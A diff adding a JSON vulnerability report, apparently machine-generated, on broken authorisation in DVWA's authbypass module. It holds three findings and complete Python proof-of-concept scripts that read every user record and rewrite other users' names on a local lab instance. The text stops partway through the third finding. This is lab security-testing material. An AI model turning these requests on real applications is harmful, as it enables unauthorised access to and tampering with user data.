@@ -1,0 +1,396 @@
+{
+  "schema_version": "wp2-output-v1",
+  "sample_id": "AUTH-001",
+  "input_version": "v2",
+  "prompt_version": "final",
+  "analysis_stage": "parent",
+  "received_packet_ids": [
+    "AUTH-001-P1",
+    "AUTH-001-P2",
+    "AUTH-001-P3"
+  ],
+  "prediction": "存在候选",
+  "verdict": "待验证",
+  "confidence": {
+    "level": "high",
+    "reason": "两条独立接口入口的数据流均在包内完整可见：AUTH-001-E 第47行把请求 JSON 的 id/first_name/surname 直接拼入 UPDATE，唯一的角色判断在第11行且只在 security=impossible 生效；AUTH-001-D 第10行的角色判断只在 high/impossible 生效，low/medium 下直接执行第15行的全表 SELECT 并在第40行整体输出。缺口是未提供 source/{level}.php、dvwaPage.inc.php 与运行配置，且本次未执行任何请求，因此仍为待验证。"
+  },
+  "findings": [
+    {
+      "finding_id": "AUTH-001-F01",
+      "vulnerability_type": "垂直+水平越权（未授权修改任意用户资料，BFLA/IDOR）",
+      "locations": [
+        {
+          "fragment_id": "AUTH-001-E",
+          "line_start": 11,
+          "line_end": 11,
+          "quote": "if (dvwaSecurityLevelGet() == \"impossible\" && dvwaCurrentUser() != \"admin\") {"
+        },
+        {
+          "fragment_id": "AUTH-001-E",
+          "line_start": 16,
+          "line_end": 16,
+          "quote": "if ($_SERVER['REQUEST_METHOD'] != \"POST\") {"
+        },
+        {
+          "fragment_id": "AUTH-001-E",
+          "line_start": 47,
+          "line_end": 47,
+          "quote": "$query = \"UPDATE users SET first_name = '\" . $data->first_name . \"', last_name = '\" .  $data->surname . \"' where user_id = \" . $data->id . \"\";"
+        },
+        {
+          "fragment_id": "AUTH-001-E",
+          "line_start": 50,
+          "line_end": 50,
+          "quote": "print json_encode (array (\"result\" => \"ok\"));"
+        },
+        {
+          "fragment_id": "AUTH-001-B",
+          "line_start": 13,
+          "line_end": 13,
+          "quote": "fetch('change_user_details.php', {"
+        },
+        {
+          "fragment_id": "AUTH-001-D",
+          "line_start": 15,
+          "line_end": 15,
+          "quote": "$query  = \"SELECT user_id, first_name, last_name FROM users\";"
+        },
+        {
+          "fragment_id": "AUTH-001-F",
+          "line_start": 26,
+          "line_end": 26,
+          "quote": "return ( isset( $dvwaSession[ 'username' ]) ? $dvwaSession[ 'username' ] : 'Unknown') ;"
+        },
+        {
+          "fragment_id": "AUTH-001-F",
+          "line_start": 33,
+          "line_end": 33,
+          "quote": "return $_COOKIE[ 'security' ];"
+        }
+      ],
+      "data_flow": [
+        "入口：AUTH-001-B 第13行以 fetch POST 调用 change_user_details.php，请求体为 JSON {id, first_name, surname}（第19行 JSON.stringify），id 来自表格行，first_name/surname 来自页面输入框（第10-11行）。",
+        "身份：AUTH-001-F 第24-26行 dvwaCurrentUser() 直接返回 $_SESSION['dvwa']['username']，即会话中写入的用户名；本包未提供登录时写入该字段的代码（见 missing_context）。",
+        "等级：AUTH-001-F 第32-33行 dvwaSecurityLevelGet() 优先返回客户端 Cookie security 的值，未做服务端校验。",
+        "防护：AUTH-001-E 第11行是唯一的角色/对象判断，条件为 security=impossible 且当前用户非 admin 才拒绝；low/medium/high 下条件为假，继续执行。",
+        "次防护：AUTH-001-E 第16行只校验 REQUEST_METHOD 必须为 POST，不校验调用者是否为被修改对象的属主或 admin。",
+        "危险操作：AUTH-001-E 第47行用 $data->first_name、$data->surname、$data->id 拼出 UPDATE users ... where user_id = <id>，对象标识完全由请求控制，与会话用户无绑定。",
+        "观察点：第50行返回 {\"result\":\"ok\"} 仅为应用自述；真实修改需通过 AUTH-001-D 第15行的 SELECT 从独立读取路径回查（第21-40行输出全部用户 JSON）。",
+        "跨阶段关联：B 的 id 字段与 E 的 $data->id 同名且由同一 JSON 键提供，E 的 first_name/surname 与 D 第34-35行输出的数组键同名，可确认 D/E 读写同一 users 表记录。"
+      ],
+      "principle": "功能级与对象级授权同时缺失：服务端把角色校验写成仅在 security=impossible 生效的单点分支，且请求体中的 user_id 未与会话主体绑定，任何能到达该入口的已登录用户（在 low/medium/high 下）都可对任意 user_id 执行 UPDATE。页面侧的角色检查与菜单隐藏都不作用于这个独立 HTTP 入口。",
+      "impact": "低权限用户可修改包括 admin 在内的任意用户 first_name/last_name，可篡改管理员显示名用于社工或与其他缺陷组合，破坏用户资料的完整性与账号归属可信度；若 admin 记录被改成攻击者可控文本，还可能影响后续依赖姓名的业务流程。",
+      "preconditions": [
+        "调用者持有可用会话：普通用户（包内页面文案示例 gordonb/abc123）即可；若 D/E 未被隐式认证保护，匿名请求同样可达（见 missing_context）。",
+        "当前 security 等级为 low、medium 或 high 之一；AUTH-001-E 第11行的拒绝分支只在 impossible 生效。",
+        "被修改的 user_id 存在于 users 表（表名与列名见 AUTH-001-E 第47行与 AUTH-001-D 第15行）。",
+        "change_user_details.php 可被直接请求：AUTH-001-B 第13行以相对路径 fetch 该文件，说明该 URL 在部署中存在。",
+        "验证时写操作仅落在专用测试记录，且需先记录原值以便恢复。"
+      ],
+      "counterexamples": [
+        "security=impossible 时 AUTH-001-E 第11-14行对非 admin 返回 {\"result\":\"fail\",\"error\":\"Access denied\"} 并 exit，写路径被阻断。",
+        "若 Web 服务器/框架在 vulnerabilities/authbypass/ 目录层强制 admin 角色（本包未提供此类配置证据），则 E 不可达。",
+        "若部署把 security 等级固定为 impossible 且普通用户无法改写该 Cookie（服务端强制覆盖），则第11行判断生效。",
+        "若数据库账号对 users 表只有 SELECT 权限，UPDATE 会失败；包内未见该约束，属未知条件。",
+        "若 E 实际未被部署（路径不存在），第13行的 fetch 将 404，本候选不成立。"
+      ],
+      "poc": {
+        "status": "需人工适配",
+        "language": "python",
+        "code": "#!/usr/bin/env python3\n# AUTH-001 F01 draft: cross-user write check for change_user_details.php.\n# Authorised local lab only. Refuses non-loopback hosts, refuses redirects,\n# never prints cookies or passwords. Records the original values, writes a\n# harmless marker to one dedicated test record, verifies with the independent\n# read endpoint and restores the original values.\nimport argparse\nimport http.cookiejar\nimport json\nimport sys\nimport urllib.error\nimport urllib.parse\nimport urllib.request\n\nALLOWED_HOSTS = {\"localhost\", \"127.0.0.1\", \"::1\"}\n\n\nclass NoRedirect(urllib.request.HTTPRedirectHandler):\n    def redirect_request(self, req, fp, code, msg, headers, newurl):\n        raise urllib.error.HTTPError(req.full_url, code, \"redirect refused: %s\" % newurl, headers, fp)\n\n\ndef build_opener():\n    jar = http.cookiejar.CookieJar()\n    return jar, urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar), NoRedirect())\n\n\ndef normalise_base(base):\n    parts = urllib.parse.urlsplit(base)\n    if parts.scheme not in (\"http\", \"https\"):\n        raise SystemExit(\"--base must start with http:// or https://\")\n    if parts.hostname not in ALLOWED_HOSTS:\n        raise SystemExit(\"only localhost/127.0.0.1/::1 are authorised, got %r\" % (parts.hostname,))\n    return base.rstrip(\"/\")\n\n\ndef read_secret(path):\n    with open(path, \"r\", encoding=\"utf-8\") as handle:\n        value = handle.read().strip()\n    if not value:\n        raise SystemExit(\"secret file %s is empty\" % path)\n    return value\n\n\ndef set_level_cookie(jar, base, level):\n    # Same cookie the application's security selector writes; no account data is faked.\n    host = urllib.parse.urlsplit(base).hostname\n    jar.set_cookie(http.cookiejar.Cookie(\n        version=0, name=\"security\", value=level, port=None, port_specified=False,\n        domain=host, domain_specified=False, domain_initial_dot=False,\n        path=\"/\", path_specified=True, secure=False, expires=None, discard=True,\n        comment=None, comment_url=None, rest={}, rfc2109=False))\n\n\ndef request_json(opener, url, body=None, method=\"GET\"):\n    data = None\n    if body is not None:\n        data = json.dumps(body).encode(\"utf-8\")\n    request = urllib.request.Request(url, data=data, method=method)\n    request.add_header(\"Accept\", \"application/json\")\n    if data is not None:\n        request.add_header(\"Content-Type\", \"application/json\")\n    with opener.open(request, timeout=10) as response:\n        return response.status, response.read().decode(\"utf-8\", \"replace\")\n\n\ndef login(opener, base, username, password):\n    body = urllib.parse.urlencode(\n        {\"username\": username, \"password\": password, \"Login\": \"Login\"}).encode(\"utf-8\")\n    request = urllib.request.Request(base + \"/login.php\", data=body, method=\"POST\")\n    request.add_header(\"Content-Type\", \"application/x-www-form-urlencoded\")\n    with opener.open(request, timeout=10) as response:\n        return response.status, response.read().decode(\"utf-8\", \"replace\")\n\n\ndef fetch_users(opener, base):\n    return request_json(opener, base + \"/vulnerabilities/authbypass/get_user_data.php\")\n\n\ndef as_rows(text):\n    data = json.loads(text)\n    if not isinstance(data, list):\n        raise ValueError(\"read endpoint returned a non-list JSON payload: %s\" % text[:200])\n    return data\n\n\ndef pick(rows, object_id):\n    for row in rows:\n        if str(row.get(\"user_id\")) == str(object_id):\n            return row\n    return None\n\n\ndef main():\n    parser = argparse.ArgumentParser()\n    parser.add_argument(\"--base\", required=True, help=\"e.g. http://127.0.0.1:8080\")\n    parser.add_argument(\"--user\", required=True, help=\"low-privilege dedicated lab account\")\n    parser.add_argument(\"--password-file\", required=True, help=\"local file with that account password\")\n    parser.add_argument(\"--security\", default=\"low\", choices=[\"low\", \"medium\", \"high\", \"impossible\"])\n    parser.add_argument(\"--test-object-id\", required=True, help=\"user_id of the disposable test record\")\n    parser.add_argument(\"--marker\", default=\"lab_marker_auth001\")\n    parser.add_argument(\"--confirm-dedicated-object\", action=\"store_true\")\n    parser.add_argument(\"--out\", default=\"auth001_f01_evidence.json\")\n    args = parser.parse_args()\n\n    if not args.confirm_dedicated_object:\n        raise SystemExit(\"refusing to write: --confirm-dedicated-object is required for the test record\")\n\n    base = normalise_base(args.base)\n    password = read_secret(args.password_file)\n    jar, opener = build_opener()\n\n    try:\n        status, _ = login(opener, base, args.user, password)\n    except urllib.error.HTTPError as exc:\n        print(\"login failed: HTTP %s\" % exc.code)\n        return 2\n    except urllib.error.URLError as exc:\n        print(\"connection error during login: %s\" % exc.reason)\n        return 2\n    if status != 200:\n        print(\"login returned HTTP %s\" % status)\n        return 2\n\n    set_level_cookie(jar, base, args.security)\n\n    try:\n        read_status, read_text = fetch_users(opener, base)\n    except urllib.error.HTTPError as exc:\n        print(\"baseline read failed: HTTP %s\" % exc.code)\n        return 2\n    except urllib.error.URLError as exc:\n        print(\"connection error during baseline read: %s\" % exc.reason)\n        return 2\n    print(\"baseline_read_status=%s\" % read_status)\n    try:\n        rows = as_rows(read_text)\n    except ValueError as exc:\n        print(\"baseline read unusable: %s\" % exc)\n        return 1\n\n    original = pick(rows, args.test_object_id)\n    if original is None:\n        print(\"test object %s not visible through the read endpoint\" % args.test_object_id)\n        return 1\n    first_name = original.get(\"first_name\")\n    surname = original.get(\"surname\")\n    print(\"original first_name=%r surname=%r\" % (first_name, surname))\n\n    marker = \"%s_%s\" % (args.marker, args.test_object_id)\n    object_id = int(args.test_object_id) if str(args.test_object_id).isdigit() else args.test_object_id\n    try:\n        write_status, write_text = request_json(\n            opener,\n            base + \"/vulnerabilities/authbypass/change_user_details.php\",\n            body={\"id\": object_id, \"first_name\": marker, \"surname\": marker},\n            method=\"POST\")\n    except urllib.error.HTTPError as exc:\n        print(\"update failed: HTTP %s\" % exc.code)\n        return 2\n    except urllib.error.URLError as exc:\n        print(\"connection error during update: %s\" % exc.reason)\n        return 2\n    print(\"update_status=%s update_body=%s\" % (write_status, write_text[:200]))\n\n    try:\n        _, verify_text = fetch_users(opener, base)\n        after = pick(as_rows(verify_text), args.test_object_id)\n    except (urllib.error.URLError, ValueError) as exc:\n        print(\"verification read failed: %s\" % exc)\n        return 2\n    after_first = after.get(\"first_name\") if after else None\n    after_surname = after.get(\"surname\") if after else None\n    print(\"after_write first_name=%r surname=%r\" % (after_first, after_surname))\n    changed = after is not None and after_first == marker and after_surname == marker\n    print(\"marker_observed=%s\" % changed)\n\n    restored_ok = False\n    try:\n        request_json(opener, base + \"/vulnerabilities/authbypass/change_user_details.php\",\n                     body={\"id\": original.get(\"user_id\"), \"first_name\": first_name, \"surname\": surname},\n                     method=\"POST\")\n        _, verify_text = fetch_users(opener, base)\n        back = pick(as_rows(verify_text), args.test_object_id)\n        restored_ok = back is not None and back.get(\"first_name\") == first_name and back.get(\"surname\") == surname\n    except (urllib.error.URLError, ValueError) as exc:\n        print(\"restore failed, restore manually: %s\" % exc)\n    print(\"restored=%s\" % restored_ok)\n\n    evidence = {\n        \"target\": base,\n        \"security\": args.security,\n        \"test_object_id\": args.test_object_id,\n        \"original\": {\"first_name\": first_name, \"surname\": surname},\n        \"after_write\": {\"first_name\": after_first, \"surname\": after_surname},\n        \"update_status\": write_status,\n        \"update_body\": write_text[:500],\n        \"marker_observed\": changed,\n        \"restored\": restored_ok,\n    }\n    with open(args.out, \"w\", encoding=\"utf-8\") as handle:\n        json.dump(evidence, handle, ensure_ascii=False, indent=2)\n    print(\"evidence=%s\" % args.out)\n\n    if changed and not restored_ok:\n        print(\"RESULT: cross-user write observed but restore is unconfirmed; restore manually\")\n        return 3\n    if changed:\n        print(\"RESULT: low-privilege account modified a record it does not own\")\n        return 0\n    print(\"RESULT: no cross-user write observed under this condition\")\n    return 1\n\n\nif __name__ == \"__main__\":\n    sys.exit(main())\n",
+        "artifact_path": null,
+        "dependencies": [
+          "Python 3.8+，仅标准库（argparse、json、urllib、http.cookiejar）",
+          "本地授权的 DVWA 实例（PHP + MySQL），可通过 127.0.0.1 访问",
+          "一个专用普通用户账号及其本地口令文件（不写入版本库）",
+          "一个可丢弃的测试用户记录（--test-object-id）及其原值"
+        ],
+        "parameters": [
+          "--base：靶场基址，仅接受 localhost/127.0.0.1/::1",
+          "--user / --password-file：普通用户账号与本地口令文件",
+          "--security：low/medium/high/impossible，默认 low",
+          "--test-object-id：专用测试记录的 user_id",
+          "--marker：无害标记值，默认 lab_marker_auth001",
+          "--confirm-dedicated-object：确认测试对象可丢弃，否则脚本拒绝写",
+          "--out：证据 JSON 输出路径"
+        ],
+        "steps": [
+          "在本地启动靶场，用管理员把 security 设为计划测试的等级，并准备一个专用测试用户记录，记录其 first_name/surname。",
+          "以普通用户会话运行本脚本（默认 security=low），观察 baseline_read_status 与 original 输出。",
+          "脚本 POST {\"id\":<test-object-id>,\"first_name\":\"<marker>\",\"surname\":\"<marker>\"} 到 /vulnerabilities/authbypass/change_user_details.php。",
+          "脚本重新 GET /vulnerabilities/authbypass/get_user_data.php，确认测试对象的两个字段是否变为标记值（独立回查路径，不依赖 result=ok）。",
+          "脚本用原值再次 POST 恢复，并第四次 GET 回查 restored=true。",
+          "对照：以 admin 账号运行同一脚本（--user admin --password-file <admin_pw>）应得到同样的 ok 与回查变化，用于确认接口本身正常工作；差异只应出现在角色上。",
+          "把 --security 改为 impossible 重跑，预期写入前返回 Access denied，作为该条件的反例记录。"
+        ],
+        "expected_observation": "security=low/medium/high 时，普通用户请求返回 update_status=200、update_body 为 {\"result\":\"ok\"}，独立回查显示测试对象字段变为 marker，恢复后回到原值；security=impossible 时返回 {\"result\":\"fail\",\"error\":\"Access denied\"}，回查不变。",
+        "success_criteria": "必须同时满足：基线读取已记录测试对象原值；写入响应为 result=ok；通过 get_user_data.php 独立回查看到标记值；恢复后回查等于原值。仅凭 HTTP 200、result=ok 或脚本退出码 0 不能判定越权成立。",
+        "limitations": [
+          "未在本次环境运行，execution_status=未运行；脚本仅为草案。",
+          "登录流程是否需要 CSRF token（user_token）、表单字段名是否为 username/password/Login 需按实际版本人工核对。",
+          "security 等级通过写入同名 Cookie 实现（等价于应用的 security 选择器），若部署在服务端强制等级，脚本设置会被忽略。",
+          "脚本只修改一个显式指定的测试记录，并在结束时恢复；若恢复失败会返回 3 并要求人工恢复。",
+          "目标必须是本地授权实例；脚本拒绝非回环主机并拒绝跟随重定向。"
+        ],
+        "execution_status": "未运行"
+      }
+    },
+    {
+      "finding_id": "AUTH-001-F02",
+      "vulnerability_type": "垂直+水平越权（未授权读取全部用户资料，数据暴露）",
+      "locations": [
+        {
+          "fragment_id": "AUTH-001-D",
+          "line_start": 10,
+          "line_end": 10,
+          "quote": "if ((dvwaSecurityLevelGet() == \"high\" || dvwaSecurityLevelGet() == \"impossible\") && dvwaCurrentUser() != \"admin\") {"
+        },
+        {
+          "fragment_id": "AUTH-001-D",
+          "line_start": 15,
+          "line_end": 15,
+          "quote": "$query  = \"SELECT user_id, first_name, last_name FROM users\";"
+        },
+        {
+          "fragment_id": "AUTH-001-D",
+          "line_start": 40,
+          "line_end": 40,
+          "quote": "print json_encode ($users);"
+        },
+        {
+          "fragment_id": "AUTH-001-D",
+          "line_start": 5,
+          "line_end": 5,
+          "quote": "dvwaDatabaseConnect();"
+        },
+        {
+          "fragment_id": "AUTH-001-B",
+          "line_start": 28,
+          "line_end": 28,
+          "quote": "xhr.open('GET', 'get_user_data.php', true);"
+        },
+        {
+          "fragment_id": "AUTH-001-F",
+          "line_start": 10,
+          "line_end": 10,
+          "quote": "if( !dvwaIsLoggedIn()) {"
+        }
+      ],
+      "data_flow": [
+        "入口：AUTH-001-B 第28行以 XHR GET 请求 get_user_data.php，无参数；该 URL 也可被直接请求，不经过页面流程。",
+        "文件结构：AUTH-001-D 第3行加载 dvwaPage.inc.php、第5行连接数据库，第10行的角色判断之前没有 dvwaPageStartup('authenticated') 之类的登录检查（AUTH-001-F 第8-14行的登录门只在其被调用时生效）。",
+        "防护：AUTH-001-D 第10行只在 security 为 high 或 impossible 时才比较 dvwaCurrentUser() 与 admin；low/medium 下条件短路，不执行拒绝分支（第11-13行）。",
+        "数据访问：AUTH-001-D 第15行 SELECT user_id, first_name, last_name FROM users 无 WHERE 子句，第21-38行逐行装入数组。",
+        "输出：第40行 print json_encode($users) 把全部用户记录整体返回，第41行 exit；调用者无需与任何记录存在归属关系。",
+        "观察点：响应为 JSON 数组且行数大于 1、包含与会话用户名不同的 user_id，才说明读到了他人资料；空数组或 {\"result\":\"fail\"} 不算。"
+      ],
+      "principle": "独立数据接口的授权判断被绑定在特定 security 等级上：只有 high/impossible 才检查 admin，low/medium 下完全没有对象级或角色级校验；同时该入口不继承页面 A 的认证流程与 C 的角色检查，菜单隐藏（G 第32-34行）也只影响渲染。",
+      "impact": "任何已登录用户（low/medium 下，且很可能包括匿名请求）可一次性读取全部用户的 user_id、first_name、last_name，形成用户枚举与个人信息泄露，并为 F01 的定向修改提供对象 ID。",
+      "preconditions": [
+        "当前 security 等级为 low 或 medium（D 第10行的判断不生效）。",
+        "D 的 URL /vulnerabilities/authbypass/get_user_data.php 可从 Web 根直接访问。",
+        "users 表存在且包含至少两条记录，其中至少一条不属于调用者。",
+        "若为匿名测试，需确认 dvwaPage.inc.php 的包含不会隐式启动登录校验（未提供，见 missing_context）。"
+      ],
+      "counterexamples": [
+        "security=high 或 impossible 时 AUTH-001-D 第10-13行对非 admin 返回 {\"result\":\"fail\",\"error\":\"Access denied\"} 并 exit，读路径被阻断。",
+        "若入口被 .htaccess、反向代理或全局中间件强制 admin（本包未提供配置证据），直接请求会被拒绝。",
+        "若部署等级恒为 impossible，则第10行生效，且第22-25行还会对姓名做 htmlspecialchars 转义。",
+        "若 users 表对所有用户只返回当前主体（视图/行级权限），则需另行验证；包内第15行显示的是无 WHERE 的全表查询。"
+      ],
+      "poc": {
+        "status": "需人工适配",
+        "language": "python",
+        "code": "#!/usr/bin/env python3\n# AUTH-001 F02 draft: read-only authorisation check for get_user_data.php.\n# Authorised local lab only. Loopback targets only, no redirect following,\n# credentials from a local file, nothing sensitive is printed.\nimport argparse\nimport http.cookiejar\nimport json\nimport sys\nimport urllib.error\nimport urllib.parse\nimport urllib.request\n\nALLOWED_HOSTS = {\"localhost\", \"127.0.0.1\", \"::1\"}\n\n\nclass NoRedirect(urllib.request.HTTPRedirectHandler):\n    def redirect_request(self, req, fp, code, msg, headers, newurl):\n        raise urllib.error.HTTPError(req.full_url, code, \"redirect refused: %s\" % newurl, headers, fp)\n\n\ndef build_opener():\n    jar = http.cookiejar.CookieJar()\n    return jar, urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar), NoRedirect())\n\n\ndef normalise_base(base):\n    parts = urllib.parse.urlsplit(base)\n    if parts.scheme not in (\"http\", \"https\"):\n        raise SystemExit(\"--base must start with http:// or https://\")\n    if parts.hostname not in ALLOWED_HOSTS:\n        raise SystemExit(\"only localhost/127.0.0.1/::1 are authorised, got %r\" % (parts.hostname,))\n    return base.rstrip(\"/\")\n\n\ndef read_secret(path):\n    with open(path, \"r\", encoding=\"utf-8\") as handle:\n        value = handle.read().strip()\n    if not value:\n        raise SystemExit(\"secret file %s is empty\" % path)\n    return value\n\n\ndef set_level_cookie(jar, base, level):\n    # Same cookie the application's security selector writes.\n    host = urllib.parse.urlsplit(base).hostname\n    jar.set_cookie(http.cookiejar.Cookie(\n        version=0, name=\"security\", value=level, port=None, port_specified=False,\n        domain=host, domain_specified=False, domain_initial_dot=False,\n        path=\"/\", path_specified=True, secure=False, expires=None, discard=True,\n        comment=None, comment_url=None, rest={}, rfc2109=False))\n\n\ndef login(jar, opener, base, username, password):\n    body = urllib.parse.urlencode(\n        {\"username\": username, \"password\": password, \"Login\": \"Login\"}).encode(\"utf-8\")\n    request = urllib.request.Request(base + \"/login.php\", data=body, method=\"POST\")\n    request.add_header(\"Content-Type\", \"application/x-www-form-urlencoded\")\n    with opener.open(request, timeout=10) as response:\n        return response.status\n\n\ndef fetch_users(opener, base):\n    request = urllib.request.Request(base + \"/vulnerabilities/authbypass/get_user_data.php\")\n    request.add_header(\"Accept\", \"application/json\")\n    with opener.open(request, timeout=10) as response:\n        return response.status, response.read().decode(\"utf-8\", \"replace\")\n\n\ndef classify(status, text):\n    try:\n        payload = json.loads(text)\n    except ValueError:\n        return {\"kind\": \"not-json\", \"status\": status, \"snippet\": text[:200]}\n    if isinstance(payload, dict):\n        return {\"kind\": \"json-object\", \"status\": status, \"payload\": payload,\n                \"access_denied\": payload.get(\"error\") == \"Access denied\"}\n    rows = [row for row in payload if isinstance(row, dict)]\n    return {\"kind\": \"json-list\", \"status\": status, \"row_count\": len(rows),\n            \"user_ids\": [row.get(\"user_id\") for row in rows]}\n\n\ndef main():\n    parser = argparse.ArgumentParser()\n    parser.add_argument(\"--base\", required=True, help=\"e.g. http://127.0.0.1:8080\")\n    parser.add_argument(\"--user\", required=True, help=\"low-privilege dedicated lab account\")\n    parser.add_argument(\"--password-file\", required=True, help=\"local file with that account password\")\n    parser.add_argument(\"--security\", default=\"low\", choices=[\"low\", \"medium\", \"high\", \"impossible\"])\n    parser.add_argument(\"--control-user\", default=None, help=\"optional admin account for the minimal normal request\")\n    parser.add_argument(\"--control-password-file\", default=None)\n    parser.add_argument(\"--out\", default=\"auth001_f02_evidence.json\")\n    args = parser.parse_args()\n\n    base = normalise_base(args.base)\n    password = read_secret(args.password_file)\n\n    jar, opener = build_opener()\n    try:\n        login(jar, opener, base, args.user, password)\n    except urllib.error.HTTPError as exc:\n        print(\"login failed: HTTP %s\" % exc.code)\n        return 2\n    except urllib.error.URLError as exc:\n        print(\"connection error during login: %s\" % exc.reason)\n        return 2\n    set_level_cookie(jar, base, args.security)\n\n    try:\n        status, text = fetch_users(opener, base)\n    except urllib.error.HTTPError as exc:\n        print(\"request failed: HTTP %s\" % exc.code)\n        return 2\n    except urllib.error.URLError as exc:\n        print(\"connection error: %s\" % exc.reason)\n        return 2\n\n    observed = classify(status, text)\n    print(\"low_privilege: status=%s kind=%s\" % (status, observed[\"kind\"]))\n    if observed[\"kind\"] == \"json-list\":\n        print(\"low_privilege: rows=%d user_ids=%s\" % (observed[\"row_count\"], observed[\"user_ids\"]))\n\n    control = None\n    if args.control_user and args.control_password_file:\n        control_password = read_secret(args.control_password_file)\n        control_jar, control_opener = build_opener()\n        try:\n            login(control_jar, control_opener, base, args.control_user, control_password)\n            set_level_cookie(control_jar, base, args.security)\n            control_status, control_text = fetch_users(control_opener, base)\n            control = classify(control_status, control_text)\n            print(\"control: status=%s kind=%s\" % (control_status, control[\"kind\"]))\n            if control[\"kind\"] == \"json-list\":\n                print(\"control: rows=%d\" % control[\"row_count\"])\n        except (urllib.error.HTTPError, urllib.error.URLError) as exc:\n            print(\"control request failed, continuing: %s\" % exc)\n\n    evidence = {\n        \"target\": base,\n        \"security\": args.security,\n        \"low_privilege\": observed,\n        \"control\": control,\n    }\n    with open(args.out, \"w\", encoding=\"utf-8\") as handle:\n        json.dump(evidence, handle, ensure_ascii=False, indent=2)\n    print(\"evidence=%s\" % args.out)\n\n    if observed[\"kind\"] == \"json-list\" and observed[\"row_count\"] >= 2:\n        print(\"RESULT: the endpoint returned other users' records to this principal\")\n        return 0\n    if observed.get(\"access_denied\"):\n        print(\"RESULT: access denied for this principal under this condition\")\n        return 1\n    print(\"RESULT: no list of user records observed; inspect the saved evidence\")\n    return 1\n\n\nif __name__ == \"__main__\":\n    sys.exit(main())\n",
+        "artifact_path": null,
+        "dependencies": [
+          "Python 3.8+，仅标准库（argparse、json、urllib、http.cookiejar）",
+          "本地授权的 DVWA 实例（PHP + MySQL），可通过 127.0.0.1 访问",
+          "一个专用普通用户账号；可选一个 admin 账号用于正常对照"
+        ],
+        "parameters": [
+          "--base：靶场基址，仅接受 localhost/127.0.0.1/::1",
+          "--user / --password-file：普通用户账号与本地口令文件",
+          "--security：low/medium/high/impossible，默认 low",
+          "--control-user / --control-password-file：可选 admin 对照账号",
+          "--out：证据 JSON 输出路径"
+        ],
+        "steps": [
+          "准备本地靶场与一个普通用户、一个 admin 账号，口令放在本地文件中。",
+          "以普通用户运行脚本（默认 security=low），读取 get_user_data.php，记录 status、行数与 user_id 列表。",
+          "以 --control-user admin 重跑同一请求，比较两者响应结构是否一致（正常对照）。",
+          "把 --security 改为 impossible 重跑，预期返回 Access denied，记录该条件为反例。",
+          "保存证据 JSON，确认返回的是多条他人记录而不是单个主体记录。"
+        ],
+        "expected_observation": "security=low/medium 时普通用户 GET 返回 HTTP 200 与 JSON 数组，包含多个 user_id 及他人的 first_name/surname；admin 对照返回同构数组；security=high/impossible 时非 admin 返回 {\"result\":\"fail\",\"error\":\"Access denied\"}。",
+        "success_criteria": "HTTP 200 且响应为 JSON 数组、行数≥2、包含与调用者会话用户名不同的 user_id，并与 admin 对照的响应结构一致。仅 HTTP 200、仅空数组或仅 result=ok 均不足以判定。",
+        "limitations": [
+          "未在本次环境运行，execution_status=未运行；脚本仅为草案。",
+          "普通用户与 admin 的用户名/口令未提供，需人工填入；脚本不打印口令或 Cookie。",
+          "匿名可达性未验证：脚本始终先登录，若要测试匿名需人工删除登录步骤并核对会话行为。",
+          "security 等级通过同名 Cookie 设置（等价于应用的安全等级选择器），服务端强制等级时该设置无效。"
+        ],
+        "execution_status": "未运行"
+      }
+    },
+    {
+      "finding_id": "AUTH-001-F03",
+      "vulnerability_type": "垂直越权（管理页面级授权缺失/可绕过）",
+      "locations": [
+        {
+          "fragment_id": "AUTH-001-A",
+          "line_start": 6,
+          "line_end": 6,
+          "quote": "dvwaPageStartup( array( 'authenticated' ) );"
+        },
+        {
+          "fragment_id": "AUTH-001-A",
+          "line_start": 33,
+          "line_end": 33,
+          "quote": "require_once DVWA_WEB_PAGE_TO_ROOT . \"vulnerabilities/authbypass/source/{$vulnerabilityFile}\";"
+        },
+        {
+          "fragment_id": "AUTH-001-C",
+          "line_start": 2,
+          "line_end": 6,
+          "quote": "if (dvwaCurrentUser() != \"admin\") {"
+        },
+        {
+          "fragment_id": "AUTH-001-G",
+          "line_start": 32,
+          "line_end": 32,
+          "quote": "if (dvwaCurrentUser() == \"admin\") {"
+        },
+        {
+          "fragment_id": "AUTH-001-A",
+          "line_start": 64,
+          "line_end": 64,
+          "quote": "populate_form();"
+        },
+        {
+          "fragment_id": "AUTH-001-B",
+          "line_start": 28,
+          "line_end": 28,
+          "quote": "xhr.open('GET', 'get_user_data.php', true);"
+        },
+        {
+          "fragment_id": "AUTH-001-B",
+          "line_start": 13,
+          "line_end": 13,
+          "quote": "fetch('change_user_details.php', {"
+        }
+      ],
+      "data_flow": [
+        "AUTH-001-A 第6行只调用 dvwaPageStartup(['authenticated'])，语义是“必须已登录”，不包含角色判断。",
+        "AUTH-001-A 第17-31行按 dvwaSecurityLevelGet() 选择 low/medium/high/impossible 对应的 source 文件，第33行 require 该文件；角色检查 C 就是被包含文件的一部分。",
+        "按包内“必要条件”的明示：low.php 无额外执行语句，medium/high/impossible 版本才有角色检查（C 第2-6行对非 admin 输出 Unauthorised、置 403 并 exit）。",
+        "因此 low 等级下 A 执行完第33行后不会发生任何角色判断，继续到第75行 dvwaHtmlEcho($page) 输出页面。",
+        "AUTH-001-A 第64行调用 populate_form()，AUTH-001-B 第26-28行随即 GET get_user_data.php，把返回的用户列表渲染成可编辑表格（B 第40-50行），点击 Update 触发 B 第13行的 POST。",
+        "菜单侧：AUTH-001-G 第32-34行只在 dvwaCurrentUser() == 'admin' 时把 authbypass 菜单项加入 vulnerabilities 区块；非 admin 只是看不到入口，直接 GET /vulnerabilities/authbypass/ 不经过该判断。",
+        "观察点：同一 URL、同一方法下比较 admin 与普通用户的 HTTP 状态与正文（是否 403/Unauthorised、是否含 user_table 容器）。"
+      ],
+      "principle": "页面入口把认证与授权分开处理：认证由 A 第6行统一执行，授权却依赖按等级切换的 source 文件。low 等级下被包含文件不含角色检查，导致“仅 admin 可访问”的业务约定在页面上失效；菜单隐藏（G 第32-34行）属于表现层，不能替代访问控制。",
+      "impact": "低权限用户在 low 等级下可直接打开用户管理页面，看到全部用户表格并调用修改接口（与 F01/F02 组合），使“该页面仅 admin 可见”的约定失效，并降低攻击者发现两个接口的门槛。",
+      "preconditions": [
+        "当前 security 等级为 low（被包含的 low.php 无角色检查）。",
+        "调用者已登录（A 第6行的 authenticated 检查必须通过）。",
+        "页面 URL /vulnerabilities/authbypass/ 可被直接请求，且未被 Web 服务器层额外限制。",
